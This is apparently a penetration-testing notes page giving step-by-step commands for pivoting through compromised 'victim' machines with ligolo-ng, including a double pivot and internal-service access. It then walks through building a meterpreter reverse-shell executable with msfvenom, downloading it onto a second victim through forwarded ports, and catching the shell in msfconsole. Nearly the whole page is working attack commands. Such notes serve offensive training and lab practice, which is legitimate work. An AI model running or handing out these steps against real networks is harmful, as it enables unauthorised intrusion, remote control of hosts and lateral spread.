---
title: Pivot
layout: default
parent: Lateral Movement
nav_order: 1
---

## Ligolo-ng ##

When using nmap with ligolo should specify `--unprivileged` to avoid false positives.

1. Install if haven't.\
`sudo apt install ligolo-ng`

2. Download the proxy agent files here:\
`https://github.com/nicocha30/ligolo-ng/releases`

3. Add ligolo TUN interface:\
`sudo ip tuntap add user <Your Username> mode tun ligolo`

4. Enable the interface:\
`sudo ip link set ligolo up`

5. Start our proxy server in attacker machine:\
`ligolo-proxy -selfcert -laddr 0.0.0.0:21`

6. In our victim:\
`./agent -connect <Attack IP>:21 -ignore-cert`

7. Once it is connected, go back to attacker machine should see agent connected. Run the `session` command and select the victim machine.

8. Run the following (in the ligolo interface!). This will show you what network the victim can access to:\
`ifconfig`

9. Based on the results above, use the following command (in linux not ligolo interface!). In this example the victim internal network ipv4 is 192.168.56.128/24:\
`sudo ip route add 192.168.56.0/24 dev ligolo`

10. In ligolo interface with the selected agent, run `start`

If <b>double pivot</b> is required (you have proxy on the first victim already, but need proxy on a second victim also through first victim)
1. Add a second ligolo TUN interface:\
`sudo ip tuntap add user <Your Username> mode tun ligolo2`

2. Enable the interface:\
`sudo ip link set ligolo2 up`

3. In your ligolo interface with the first victim selected, redirect the port 21 of first victim to our kali port 21:\
`listener_add --addr 0.0.0.0:21 --to 127.0.0.1:21 --tcp`

4. To confirm it has been added:\
`listener_list`

5. Now run the agent on the second victim (assuming it is windows):\
`./agent.exe -connect <IP of First Pivot Point>:21 -ignore-cert`

6. Run the following for second victim (in the ligolo interface!). This will show you what network the second victim can access to:\
`ifconfig`

7. Based on the results above, use the following command (in linux not ligolo interface!). In this example the second victim internal network ipv4 is 10.1.30.132/24:\
`sudo ip add route 10.1.30.0/24 dev ligolo2`

8. In ligolo interface with the selected agent, run\
`tunnel_start --tun ligolo2`

Setting up <b>reverse shell</b> if the second victim cannot reach attacker machine directly
1. Generate a reverse shell (but the IP must be for the <b>first victim!</b>):\
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.128 LPORT=5656 EXITFUNC=thread -f exe -o shell.exe`

2. To ensure you can download files on second victim from Kali, run this under ligolo interface for first victim. This forwards port 2222 of first victim to kali port 8888:\
`listener_add --addr 0.0.0.0:2222 --to 127.0.0.1:8888 --tcp`

3. Then we can set up python download server on 8888:\
`python3 -m http.server 8888`

4. Download the file on second victim (IP here is the first victim):\
`Invoke-WebRequest -Uri "http://192.168.56.128:2222/shell.exe" -OutFile shell.exe`

5. On the ligolo interface for first victim run the following which will forward port 5656 on first victim to port 4444 on kali:\
`listener_add --addr 0.0.0.0:5656 --to 127.0.0.1:4444 --tcp`

6. Wait for incoming connecting after running this:
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 4444
exploit
```

If you want to access <b>internal services available only to that localhost of first victim</b>, run the following on kali interface:\
`sudo ip route add 240.0.0.1/32 dev ligolo`

You can then use 240.0.0.1 as if you are accessing 127.0.0.1 on the first victim. For example this will be like running nmap 127.0.0.1 on first victim:\
`nmap 240.0.0.1`